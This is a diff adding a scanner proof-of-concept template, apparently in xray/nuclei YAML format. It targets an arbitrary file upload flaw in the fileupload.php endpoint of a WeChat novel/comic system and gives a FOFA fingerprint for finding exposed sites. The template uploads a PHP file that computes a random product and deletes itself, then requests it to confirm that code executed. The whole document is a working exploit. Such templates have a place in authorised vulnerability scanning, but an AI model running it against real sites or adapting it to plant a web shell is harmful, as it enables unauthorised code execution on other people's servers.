@@ -1,0 +1,36 @@
+id: poc-yaml-wechat-novel-webuploader-upload
+info:
+  name: 微信公众号小说漫画系统 fileupload.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 微信公众号小说漫画系统
+  fofa: body="/Public/home/mhjs/jquery.js"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /Public/webuploader/0.1.5/server/fileupload.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+  data: '------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    Content-Disposition: form-data; name="file"; filename="{{.filename}}.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php print({{.t1}}*{{.t2}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"\\\"jsonrpc\\\"\") &&\ncontains(body,\"\
+    \\\"result\\\"\")\n"
+- method: GET
+  path: /Public/webuploader/0.1.5/server/upload/{{.filename}}.php
+  expression: "status_code == 200 && \nbody == t3\n"
+transport: http
